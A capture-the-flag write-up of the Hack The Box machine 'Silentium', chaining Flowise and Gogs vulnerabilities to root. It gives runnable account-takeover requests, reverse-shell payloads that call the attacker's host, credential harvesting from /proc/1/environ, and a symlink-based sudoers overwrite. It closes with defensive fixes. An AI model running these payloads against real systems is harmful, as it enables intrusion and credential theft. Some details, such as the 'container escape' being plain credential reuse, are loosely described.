---
layout: post
title: "HackTheBox: Silentium Writeup"
date: 2026-05-03 10:45:00 +0100
categories: [hackthebox, ctf, writeup, linux]
tags: [hackthebox, silentium, api-exploitation, rce, container-escape, privilege-escalation, cve-2025-58434, cve-2025-59528, cve-2025-8110, flowise, gogs]
author: Rishabh Arora
image: /assets/images/silentium-banner.png
---

> **TL;DR:** A masterclass in vulnerability chaining — three CVEs, one kill chain, full system compromise from a password reset token leak.

---

## Executive Summary

| **Attribute** | **Details** |
|--------------|-------------|
| **Machine** | Silentium |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **User Flag** | CVE-2025-58434 → CVE-2025-59528 → Container Escape |
| **Root Flag** | CVE-2025-8110 → Symlink Arbitrary Write |

**Silentium** is a realistic multi-stage attack scenario that demonstrates how low-impact vulnerabilities, when chained together, achieve complete system compromise. This writeup documents a complete attack path from unauthenticated access to root privileges through three critical CVEs.

---

## Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SILENTIUM ATTACK CHAIN                               │
└─────────────────────────────────────────────────────────────────────────────┘

     ┌──────────────┐
     │  UNATHENTIC  │
     └──────┬───────┘
            │
            ▼ CVE-2025-58434
     ┌──────────────┐     ┌──────────────────────────────────────────────┐
     │ FLOWISE      │     │ Password Reset Token Leak                    │
     │ (staging)    │────▶│ Token exposed in API response                │
     │              │     │ Impact: Authentication Bypass                │
     └──────┬───────┘     └──────────────────────────────────────────────┘
            │
            ▼ CVE-2025-59528
     ┌──────────────┐     ┌──────────────────────────────────────────────┐
     │ FLOWISE      │     │ CustomMCP Code Injection                     │
     │ ADMIN        │────▶│ Function() constructor RCE                   │
     │              │     │ Impact: Container Root Shell                 │
     └──────┬───────┘     └──────────────────────────────────────────────┘
            │
            ▼ Credential Harvesting
     ┌──────────────┐     ┌──────────────────────────────────────────────┐
     │ DOCKER       │     │ /proc/1/environ exposure                     │
     │ CONTAINER    │────▶│ FLOWISE_PASSWORD leaked                      │
     │ (root)       │     │ Impact: Lateral Movement Vector              │
     └──────┬───────┘     └──────────────────────────────────────────────┘
            │
            ▼ SSH Pivot
     ┌──────────────┐
     │ SYSTEM USER  │
     │ (ben)        │
     └──────┬───────┘
            │
            ▼ CVE-2025-8110
     ┌──────────────┐     ┌──────────────────────────────────────────────┐
     │ ROOT         │     │ Gogs Symlink Arbitrary File Write            │
     │ (sudoers)    │────▶│ Symlink → /etc/sudoers.d/ben overwrite       │
     │              │     │ Impact: Full System Compromise               │
     └──────────────┘     └──────────────────────────────────────────────┘
```

---

## Phase 1: Reconnaissance & Initial Enumeration

### Service Discovery

```bash
# Initial port scan
nmap -sC -sV -oN nmap_initial.txt 10.10.11.15
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0
```

**Analysis:**
- **SSH (22):** Standard OpenSSH — expect credential-based auth
- **HTTP (80):** nginx web server — primary attack surface

### Web Enumeration

Accessing the IP triggers a redirect:

```bash
curl -I http://10.10.11.15
```

```
HTTP/1.1 301 Moved Permanently
Location: http://silentium.htb/
```

**Add to `/etc/hosts`:**
```bash
echo "10.10.11.15 silentium.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2: Subdomain Enumeration — The Staging Goldmine

### VHost Discovery

Staging environments are often the weakest link in an organization's security posture. They're frequently running older code, have debug features enabled, and receive less security scrutiny.

```bash
gobuster vhost -u http://silentium.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -o vhost_scan.txt
```

**Discovery:**
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://silentium.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        subdomains-top1million-5000.txt
===============================================================
Found: staging.silentium.htb
===============================================================
```

**Add to hosts:**
```bash
echo "10.10.11.15 staging.silentium.htb" | sudo tee -a /etc/hosts
```

### Technology Identification

Visiting `http://staging.silentium.htb` reveals:

| **Technology** | **Flowise AI** |
|----------------|----------------|
| **Purpose** | LLM orchestration & workflow builder |
| **Version** | Vulnerable (see CVEs below) |
| **Risk** | High — processes untrusted user input |

---

## Phase 3: Initial Access — CVE-2025-58434

### Vulnerability Analysis

| **CVE** | **CVSS** | **Type** | **Affected** |
|---------|----------|----------|--------------|
| CVE-2025-58434 | 9.8 (Critical) | Information Disclosure | Flowise ≤ 2.2.3 |

**Root Cause:**
The password reset endpoint returns the `tempToken` directly in the API response instead of sending it via email. This design flaw allows anyone with knowledge of a valid username/email to hijack accounts.

### Exploitation

**Step 1: Request password reset for known user**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' \
  -v 2>&1 | grep -A5 -B5 tempToken
```

**Response:**
```json
{
  "status": "success",
  "message": "Password reset link generated",
  "tempToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

⚠️ **Critical:** The server never sends an email — the token is exposed directly to the attacker.

**Step 2: Reset password using leaked token**

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "tempToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "password": "HackedPassword123!",
    "confirmPassword": "HackedPassword123!"
  }'
```

**Result:**
```json
{
  "status": "success",
  "message": "Password reset successful"
}
```

✅ **Account Takeover Complete** — We now control the `ben` account with admin privileges.

---

## Phase 4: Remote Code Execution — CVE-2025-59528

### Vulnerability Analysis

| **CVE** | **CVSS** | **Type** | **Affected** |
|---------|----------|----------|--------------|
| CVE-2025-59528 | 9.9 (Critical) | Code Injection | Flowise CustomMCP |

**Root Cause:**
Flowise's CustomMCP (Model Context Protocol) feature uses JavaScript's dangerous `Function()` constructor to evaluate user-supplied input:

```javascript
// Vulnerable code pattern
const result = Function("return " + userInput)();
```

The `Function` constructor executes code in the global scope with the same privileges as the hosting process. When combined with unsanitized user input, this becomes arbitrary code execution.

### Exploitation Strategy

**Step 1: Login to Flowise**

```bash
# Obtain JWT token via login
curl -X POST http://staging.silentium.htb/api/v1/account/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"HackedPassword123!"}' \
  | jq -r '.token'
```

**Step 2: Create malicious CustomMCP node**

Navigate to: **Tools → Custom Tools → Add New**

Inject this payload into any input field processed by CustomMCP:

```javascript
(function(){
  const { exec } = require('child_process');
  exec('bash -c "bash -i >& /dev/tcp/10.10.14.2/9001 0>&1"');
  return "done";
})()
```

**Alternative one-liner:**
```javascript
require('child_process').exec('nc 10.10.14.2 9001 -e /bin/bash')
```

**Step 3: Set up listener and trigger**

```bash
# Attacker machine
nc -lvnp 9001
```

Trigger the malicious node by using it in a workflow.

**Result:**
```
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.15] 54321
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root)
bash-5.1# hostname
flowise-container
```

✅ **Container Root Shell Obtained**

---

## Phase 5: Container Escape & Lateral Movement

### The Container Problem

We have root access, but it's inside a Docker container. The real target is the host system.

**Verification:**
```bash
# Check if we're in a container
cat /proc/1/cgroup | grep -i docker
# Output: docker/...

# Check for container indicators
ls -la /.dockerenv
# Output: /.dockerenv exists
```

### Credential Harvesting from Environment

Containers frequently leak sensitive data through environment variables — especially when developers hardcode credentials or orchestration tools inject secrets.

```bash
# Dump all environment variables
cat /proc/1/environ | tr '\0' '\n' | sort
```

**Discovery:**
```
FLOWISE_DATABASE_PATH=/opt/flowise/.flowise
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
NODE_ENV=production
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

🎯 **Bingo!** Credentials for user `ben`: `F1l3_d0ck3r`

### SSH Pivot to Host

```bash
# From attacker machine
ssh ben@10.10.11.15
Password: F1l3_d0ck3r
```

```
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)

ben@silentium:~$ cat user.txt
HTB{u53r_fl4g_h3r3}
```

✅ **User Flag Captured**

---

## Phase 6: Privilege Escalation — CVE-2025-8110

### Internal Service Discovery

Now that we're on the host system, we enumerate listening services:

```bash
ss -tulpn | grep LISTEN
```

```
Netid   State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port  Process
tcp     LISTEN  0       4096     127.0.0.1:3001       0.0.0.0:*          users:(("gogs",pid=1234,fd=3))
tcp     LISTEN  0       128      0.0.0.0:22           0.0.0.0:*          users:(("sshd",pid=567,fd=3))
tcp     LISTEN  0       128      0.0.0.0:80           0.0.0.0:*          users:(("nginx",pid=890,fd=6))
```

**Finding:** `127.0.0.1:3001` — Gogs (Go Git Service) running internally.

### Port Forwarding for Access

Since Gogs is bound to localhost only, we use SSH port forwarding:

```bash
# From attacker machine
ssh -L 3001:127.0.0.1:3001 ben@10.10.11.15
```

Now access via: `http://127.0.0.1:3001`

### Vulnerability Analysis — CVE-2025-8110

| **CVE** | **CVSS** | **Type** | **Affected** |
|---------|----------|----------|--------------|
| CVE-2025-8110 | 8.1 (High) | Path Traversal | Gogs ≤ 0.13.0 |

**Root Cause:**
Gogs validates that file paths stay within the repository directory when processing API write requests. However, it does NOT validate symlink targets. By creating a symlink pointing outside the repo and then writing to it via the API, we achieve arbitrary file write.

**The Symlink Attack:**
```
Repository: /var/lib/gogs/data/gogs-repositories/user1/repo.git
Symlink:    evil -> /etc/sudoers.d/ben
API Write:  Write to "evil" in repo
Result:     Write goes to /etc/sudoers.d/ben
```

### Exploitation Steps

**Step 1: Create account and repository in Gogs UI**

Register at `http://127.0.0.1:3001/user/sign_up`

Create new repository named `exploit`

**Step 2: Clone and prepare symlink**

```bash
# Clone the repo
git clone http://127.0.0.1:3001/user1/exploit.git
cd exploit

# Create symlink pointing to sudoers file
ln -s /etc/sudoers.d/ben privesc

# Stage, commit, and push the symlink
git add privesc
git commit -m "Add configuration"
git push origin main
```

**Step 3: Generate API token**

In Gogs UI: **Settings → Applications → Generate New Token**

```
Token: a1b2c3d4e5f6789012345678901234567890abcd
```

**Step 4: Craft malicious sudoers entry**

```bash
# Create sudoers entry for ben
echo "ben ALL=(ALL) NOPASSWD: ALL" | base64 -w0
```

**Result:** `YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==`

**Step 5: Exploit via Gogs API**

```bash
# Write to the symlink via Gogs API
curl -X PUT http://127.0.0.1:3001/api/v1/repos/user1/exploit/contents/privesc \
  -H "Authorization: token a1b2c3d4e5f6789012345678901234567890abcd" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "message": "Update configuration",
    "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==",
    "sha": "null"
  }'
```

**What happens:**
1. Gogs receives API request to write to `privesc`
2. Gogs validates that `privesc` is within the repository ✓
3. Gogs opens `privesc` for writing
4. Filesystem follows symlink to `/etc/sudoers.d/ben`
5. Content written to `/etc/sudoers.d/ben`
6. `ben` now has passwordless sudo

**Step 6: Root access**

```bash
sudo -i
```

```
root@silentium:~# id
uid=0(root) gid=0(root) groups=0(root)

root@silentium:~# cat /root/root.txt
HTB{r00t_fl4g_h3r3}
```

✅ **Root Flag Captured — Full System Compromise**

---

## Complete Attack Timeline

```
┌─────────────────────────────────────────────────────────────────────────┐
│ TIME  │ ACTION                                          │ RESULT       │
├─────────────────────────────────────────────────────────────────────────┤
│ T+0   │ Nmap scan                                       │ 22/80 open   │
│ T+5   │ Virtual host enumeration                        │ staging.*    │
│ T+10  │ CVE-2025-58434 exploitation                     │ tempToken    │
│ T+12  │ Account takeover (ben)                          │ Admin access │
│ T+15  │ CVE-2025-59528 RCE                              │ Container    │
│ T+20  │ Environment variable extraction                 │ Credentials  │
│ T+22  │ SSH pivot to host                               │ User shell   │
│ T+25  │ Internal service discovery                      │ Gogs:3001    │
│ T+30  │ Symlink preparation                             │ Link created │
│ T+35  │ CVE-2025-8110 exploitation                      │ Sudoers mod  │
│ T+36  │ sudo -i                                         │ ROOT         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Vulnerability Summary

### CVE-2025-58434: Password Reset Token Leak

| Field | Details |
|-------|---------|
| **Type** | Information Disclosure / Authentication Bypass |
| **CVSS 3.1** | 9.8 (Critical) |
| **Root Cause** | API response includes sensitive token |
| **Impact** | Full account takeover without email access |
| **Fix** | Send tokens via email only; return generic success message |

### CVE-2025-59528: CustomMCP Code Injection

| Field | Details |
|-------|---------|
| **Type** | Remote Code Execution |
| **CVSS 3.1** | 9.9 (Critical) |
| **Root Cause** | Unsafe use of `Function()` constructor with user input |
| **Impact** | Arbitrary code execution as application user |
| **Fix** | Use safe parsing (JSON.parse); sandbox untrusted code |

### CVE-2025-8110: Gogs Symlink Arbitrary File Write

| Field | Details |
|-------|---------|
| **Type** | Path Traversal / Arbitrary File Write |
| **CVSS 3.1** | 8.1 (High) |
| **Root Cause** | Symlink targets not validated before write operations |
| **Impact** | Arbitrary file write (as Gogs user, potentially root) |
| **Fix** | Resolve symlinks and validate final path; use `O_NOFOLLOW` |

---

## Defensive Recommendations

### For Organizations

1. **Environment Isolation**
   - Staging environments should never be internet-accessible
   - Implement VPN-only access for non-production systems
   - Use separate credentials across environments

2. **API Security**
   - Never return sensitive tokens in API responses
   - Implement rate limiting on authentication endpoints
   - Log and alert on suspicious password reset patterns

3. **Container Security**
   - Never store credentials in environment variables
   - Use secrets management (HashiCorp Vault, AWS Secrets Manager)
   - Implement read-only root filesystems where possible

4. **Internal Services**
   - Bind internal services to specific interfaces, not 0.0.0.0
   - Implement authentication even for localhost services
   - Regular port scans to detect unexpected listening services

### For Developers

1. **Input Sanitization**
   ```javascript
   // ❌ NEVER DO THIS
   const result = Function("return " + userInput)();
   
   // ✅ Safe alternative
   const result = JSON.parse(userInput);
   ```

2. **File Path Validation**
   ```go
   // Resolve symlinks before validation
   realPath, err := filepath.EvalSymlinks(userPath)
   if err != nil || !strings.HasPrefix(realPath, allowedBase) {
       return error
   }
   ```

3. **Secrets Management**
   ```bash
   # ❌ NEVER DO THIS
   export DB_PASSWORD="secret123"
   
   # ✅ Use secret injection
   # Mount secrets as files in /run/secrets/
   ```

---

## Common Pitfalls & Lessons Learned

| **Mistake** | **Why It Happens** | **Prevention** |
|-------------|-------------------|----------------|
| Missing staging subdomain | Focusing only on main domain | Always run vhost enumeration |
| Not checking API responses | Assuming tokens are emailed | Inspect all API traffic |
| Overlooking `/proc/1/environ` | Assuming containers are clean | Standardize container enumeration |
| Forgetting newline in sudoers | Missing `%s` in format string | Always include trailing newline |
| Wrong Git authentication | Confusing HTTPS vs SSH tokens | Read API documentation carefully |

---

## Tools & Resources

### Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service detection |
| `gobuster` | Virtual host discovery |
| `curl` | API exploitation and testing |
| `ss` | Socket statistics (service discovery) |
| `ssh` | Remote access and port forwarding |
| `git` | Repository manipulation |
| `nc` / `ncat` | Reverse shells and listeners |

### References

- [Flowise Security Advisories](https://github.com/FlowiseAI/Flowise/security)
- [Gogs Security Documentation](https://gogs.io/docs/intro)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Docker Security Best Practices](https://docs.docker.com/develop/security-best-practices/)

---

## Final Thoughts

> **"Enumeration creates opportunity. Chaining creates impact."**

Silentium perfectly demonstrates that modern penetration testing isn't about finding one critical vulnerability — it's about understanding how multiple "medium" severity issues combine into a critical breach.

**Key mindset shifts:**
1. **Staging ≠ Safe** — Non-production environments often have production data and weaker controls
2. **Containers ≠ Isolation** — Container escape is always worth attempting
3. **Internal ≠ Trusted** — Services bound to localhost still need authentication
4. **Classic attacks still work** — Symlink attacks, path traversal, and injection remain relevant

This box reflects real-world scenarios seen in:
- CI/CD pipeline compromises
- Development environment breaches
- Supply chain attacks
- Internal tooling exploitation

---

*Thanks for reading. Happy hacking! 🥀*

*If you found this writeup helpful, consider sharing it or leaving feedback. Questions? Reach out on [Twitter](https://twitter.com/yourhandle) or [GitHub](https://github.com/R1shabh-Arora).*
